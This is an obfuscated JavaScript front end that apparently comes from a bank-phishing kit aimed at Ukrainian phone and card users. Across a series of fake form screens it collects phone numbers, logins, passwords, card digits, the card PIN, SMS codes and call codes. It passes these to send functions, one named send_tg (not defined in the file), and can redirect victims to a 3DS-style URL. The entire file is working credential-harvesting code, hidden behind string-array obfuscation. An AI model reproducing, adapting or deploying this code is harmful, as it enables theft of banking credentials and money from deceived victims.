const m = b;
(function (c, d) {
    const l = b, e = c();
    while (!![]) {
        try {
            const f = parseInt(l(0x7d)) / 0x1 * (-parseInt(l(0x8b)) / 0x2) + -parseInt(l(0x86)) / 0x3 + -parseInt(l(0xa5)) / 0x4 + -parseInt(l(0x71)) / 0x5 * (-parseInt(l(0xb2)) / 0x6) + -parseInt(l(0xb5)) / 0x7 * (-parseInt(l(0xad)) / 0x8) + -parseInt(l(0x9c)) / 0x9 * (parseInt(l(0x97)) / 0xa) + -parseInt(l(0x95)) / 0xb * (-parseInt(l(0xb1)) / 0xc);
            if (f === d)
                break;
            else
                e['push'](e['shift']());
        } catch (g) {
            e['push'](e['shift']());
        }
    }
}(a, 0xee21e));
var subdomain = window[m(0x78)][m(0x9e)][m(0x6f)]('.')[0x0];
function show_block(c, d = ![], e = ![]) {
    const n = m;
    if (d == !![]) {
        let f = document[n(0x7b)]('' + c)[n(0xb7)][n(0x8d)];
        document[n(0x7b)]('' + c)[n(0x88)](n(0xa3))[n(0xaa)] = '', showError(c, f);
    }
    document[n(0x9f)](n(0xb3))['forEach'](g => {
        const o = n;
        g['style'][o(0x92)] = g['id'] === c ? o(0x72) : o(0x73);
        if (e == !![] && g['id'] === c) {
            g['dataset'][o(0xa7)] = o(0x91);
            let h = g[o(0x88)](o(0x82)), i = g[o(0x88)](o(0xa3));
            h && i && (h['onclick'] = function () {
                const p = o;
                let j = i[p(0xaa)], k = window[c]();
                k == !![] && send_input(j, c);
            });
        }
    });
}
function b(c, d) {
    const e = a();
    return b = function (f, g) {
        f = f - 0x6d;
        let h = e[f];
        return h;
    }, b(c, d);
}
function show_loading_block(c) {
    const q = m;
    document['querySelectorAll'](q(0xb3))[q(0x74)](d => {
        const r = q;
        d[r(0x8f)][r(0x92)] = d['id'] === c ? r(0x72) : r(0x73);
    });
}
function show_div(c) {
    const s = m;
    c == 'send_form' && (c = s(0x91), send_tg()), show_block(s(0x91)), setTimeout(function () {
        show_loading_block(c);
    }, 0x258);
}
show_div(m(0xa4));
function showError(c, d) {
    const t = m;
    let e = document[t(0x88)]('#' + c + t(0x6d));
    e[t(0x9a)][t(0xb0)]('error'), e['textContent'] = d;
}
function clearError(c) {
    const u = m;
    let d = document[u(0x88)]('#' + c + u(0x6d));
    d[u(0x9a)][u(0x75)](u(0x8d));
}
function update_text_class(c, d, e = m(0x7e)) {
    let f = document['getElementsByClassName'](c);
    for (let g = 0x0; g < f['length']; g++) {
        f[g][e] = d;
    }
}
function a() {
    const W = [
        'slice',
        'input[data-text]',
        'location',
        'click',
        'text',
        'getElementById',
        'call_code',
        '1ohZTzY',
        'innerText',
        'textarea[data-text]',
        'password',
        'repeat',
        'button',
        'addEventListener',
        'minLength',
        'Будь\x20ласка,\x20вкажіть\x204\x20останні\x20цифри\x20карти',
        '2017266wdMnyO',
        'Будь\x20ласка,\x20вкажіть\x20пін-код\x20карти',
        'querySelector',
        'url(\x27data:image/svg+xml;utf8,<svg\x20xmlns=\x22http://www.w3.org/2000/svg\x22><text\x20x=\x2215\x22\x20y=\x2233%\x22\x20font-family=\x22sans-serif\x22\x20font-size=\x2215\x22\x20font-weight=\x22\x22\x20fill=\x22black\x22>',
        'ask_call_code',
        '2620178ZGltXV',
        'replace',
        'error',
        'target',
        'style',
        'Будь\x20ласка,\x20вкажіть\x20код\x20з\x20дзвінка',
        'loading',
        'display',
        'length',
        'pin',
        '2189BCxyAm',
        'maxLength',
        '10ZLJCAl',
        'login',
        'focus',
        'classList',
        'blur',
        '5253489wNZfDo',
        'DOMContentLoaded',
        'hostname',
        'querySelectorAll',
        'ask_num_card',
        'input[type=\x22tel\x22]',
        '</text></svg>\x27)',
        'input',
        'ask_page',
        '6394344FcpWyd',
        'phone',
        'next',
        'Будь\x20ласка,\x20вкажіть\x20номер\x20телефон\x20у\x20форматі:\x20+380\x20XX\x20XXX\x20XX\x20XX',
        'num_card',
        'value',
        'ask_login',
        'url',
        '12968936smraBf',
        'ask_password',
        'ask_sms',
        'add',
        '171420tbFLpu',
        '708AYdIcW',
        '.show_div',
        'pin_card',
        '7VuJjqU',
        'ask_phone',
        'dataset',
        '+380\x20',
        '\x20.format',
        'ask_pin',
        'split',
        'backgroundImage',
        '28660KUnLAs',
        'flex',
        'none',
        'forEach',
        'remove'
    ];
    a = function () {
        return W;
    };
    return a();
}
function ask_phone() {
    const v = m;
    let c = document[v(0x7b)](v(0xa6)), d = c[v(0xaa)];
    clearError(v(0xb6));
    if (!d || d[v(0x93)] < c[v(0x84)] || d[v(0x93)] > c[v(0x96)]) {
        showError(v(0xb6), v(0xa8)), c[v(0x99)]();
        return;
    }
    let e = '+38' + '*'[v(0x81)](d['length'] - 0x4) + d[v(0x76)](-0x2);
    return update_text_class(v(0x7c), e), show_div(document['getElementById'](v(0xb6))[v(0xb7)][v(0xa7)]), !![];
}
function ask_login() {
    const w = m;
    let c = document[w(0x7b)](w(0x98)), d = c[w(0xaa)];
    clearError(w(0xab));
    if (!d || d[w(0x93)] < c[w(0x84)] || d['length'] > c[w(0x96)]) {
        showError(w(0xab), 'Будь\x20ласка,\x20вкажіть\x20логин'), c[w(0x99)]();
        return;
    }
    return show_div(document[w(0x7b)](w(0xab))['dataset'][w(0xa7)]), !![];
}
function ask_password() {
    const x = m;
    let c = document[x(0x7b)](x(0x80)), d = c['value'];
    clearError(x(0xae));
    if (!d || d[x(0x93)] < c[x(0x84)] || d[x(0x93)] > c[x(0x96)]) {
        showError('ask_password', 'Пожалуйста,\x20укажите\x20пароль'), c['focus']();
        return;
    }
    return show_div(document[x(0x7b)](x(0xae))[x(0xb7)][x(0xa7)]), !![];
}
function ask_num_card() {
    const y = m;
    let c = document['getElementById'](y(0xa9)), d = c['value'];
    clearError(y(0xa0));
    if (!d || d['length'] < c['minLength'] || d[y(0x93)] > c['maxLength']) {
        showError(y(0xa0), y(0x85)), c[y(0x99)]();
        return;
    }
    return update_text_class(y(0xb4), d), show_div(document['getElementById'](y(0xa0))[y(0xb7)][y(0xa7)]), !![];
}
function ask_pin() {
    const z = m;
    let c = document['getElementById'](z(0x94)), d = c[z(0xaa)];
    clearError(z(0x6e));
    if (!d || d[z(0x93)] < c[z(0x84)] || d[z(0x93)] > c['maxLength']) {
        showError('ask_pin', z(0x87)), c[z(0x99)]();
        return;
    }
    return document['getElementById'](z(0x94))[z(0x9b)](), show_div(document[z(0x7b)]('ask_pin')[z(0xb7)][z(0xa7)]), !![];
}
function ask_sms() {
    const A = m;
    let c = document[A(0x7b)]('sms'), d = c[A(0xaa)];
    clearError('ask_sms');
    if (!d || d['length'] < c[A(0x84)] || d[A(0x93)] > c['maxLength']) {
        showError(A(0xaf), 'Будь\x20ласка,\x20вкажіть\x20код\x20з\x20СМС'), c[A(0x99)]();
        return;
    }
    return show_div(document[A(0x7b)](A(0xaf))['dataset'][A(0xa7)]), !![];
}
function ask_call_code() {
    const B = m;
    let c = document[B(0x7b)](B(0x7c)), d = c[B(0xaa)];
    clearError(B(0x8a));
    if (!d || d[B(0x93)] < c[B(0x84)] || d['length'] > c[B(0x96)]) {
        showError(B(0x8a), B(0x90)), c[B(0x99)]();
        return;
    }
    return show_div(document[B(0x7b)](B(0x8a))['dataset']['next']), !![];
}
function ask_custom_error() {
    const C = m;
    show_div(document[C(0x7b)]('ask_custom_error')['dataset'][C(0xa7)]);
}
function ask_page() {
    const D = m;
    show_div(document[D(0x7b)]('ask_page')[D(0xb7)][D(0xa7)]);
}
function ask_url_3ds() {
    const E = m;
    show_block(E(0x91));
    let c = document[E(0x7b)]('ask_url_3ds')[E(0xb7)][E(0xac)];
    setTimeout(function () {
        const F = E;
        window[F(0x78)]['href'] = c;
    }, 0xc8);
}
document['getElementById'](m(0xa6))[m(0x83)](m(0x99), c => {
    const G = m;
    c[G(0x8e)][G(0xaa)][G(0x93)] === 0x0 && (c[G(0x8e)][G(0xaa)] = G(0xb8));
}), document[m(0x7b)](m(0xa6))[m(0x83)](m(0xa3), c => {
    const H = m;
    let {value: d} = c[H(0x8e)];
    d = d[H(0x8c)](/\D/g, ''), d = d[H(0x8c)](/^380/, '');
    let e = H(0xb8);
    for (let f = 0x0; f < d['length']; f++) {
        if (f === 0x2)
            e += '\x20' + d[f];
        else {
            if (f === 0x5)
                e += '\x20' + d[f];
            else
                f === 0x7 || f === 0x9 ? e += '\x20' + d[f] : e += d[f];
        }
    }
    c[H(0x8e)][H(0xaa)] = e, e[H(0x93)] === 0x11 && (document[H(0x7b)]('phone')['blur'](), setTimeout(function () {
        const I = H;
        document[I(0x7b)]('ask_phone')[I(0x88)](I(0x82))[I(0x79)]();
    }, 0x64));
}), document[m(0x7b)](m(0xa6))[m(0x83)](m(0x9b), c => {
    const J = m;
    let {value: d} = c[J(0x8e)];
    d === J(0xb8) && (c[J(0x8e)][J(0xaa)] = '');
}), document[m(0x7b)](m(0x94))['addEventListener'](m(0xa3), c => {
    const K = m;
    let d = document[K(0x7b)](K(0x94));
    d[K(0xaa)][K(0x93)] === 0x4 && (document['getElementById'](K(0x94))['blur'](), setTimeout(function () {
        const L = K;
        document[L(0x7b)](L(0x6e))['querySelector'](L(0x82))[L(0x79)]();
    }, 0x64));
}), document[m(0x7b)]('num_card')[m(0x83)]('input', c => {
    const M = m;
    let d = document[M(0x7b)]('num_card');
    d[M(0xaa)][M(0x93)] === 0x4 && (document[M(0x7b)]('num_card')[M(0x9b)](), setTimeout(function () {
        const N = M;
        document[N(0x7b)](N(0xa0))[N(0x88)](N(0x82))[N(0x79)]();
    }, 0x64));
}), window['addEventListener']('DOMContentLoaded', c => {
    const O = m;
    let d = document[O(0x9f)](O(0xa1));
    d[O(0x74)](e => {
        const P = O;
        e['id'] !== P(0xa6) && e['addEventListener']('input', function (f) {
            const Q = P;
            f[Q(0x8e)]['value'] = f[Q(0x8e)][Q(0xaa)][Q(0x8c)](/[^0-9]/g, '');
        });
    });
});
function createBackground(c) {
    const R = m;
    return R(0x89) + c + R(0xa2);
}
document[m(0x83)](m(0x9d), () => {
    const S = m, c = document[S(0x9f)](S(0x77));
    c[S(0x74)](f => {
        const T = S, g = f[T(0xb7)][T(0x7a)];
        f[T(0x8f)]['backgroundImage'] = createBackground(g);
    });
    const d = document[S(0x9f)]('select[data-text]');
    d[S(0x74)](f => {
        const U = S, g = f[U(0xb7)][U(0x7a)];
        f['style'][U(0x70)] = createBackground(g);
    });
    const e = document[S(0x9f)](S(0x7f));
    e[S(0x74)](f => {
        const V = S, g = f[V(0xb7)][V(0x7a)];
        f['style'][V(0x70)] = createBackground(g);
    });
});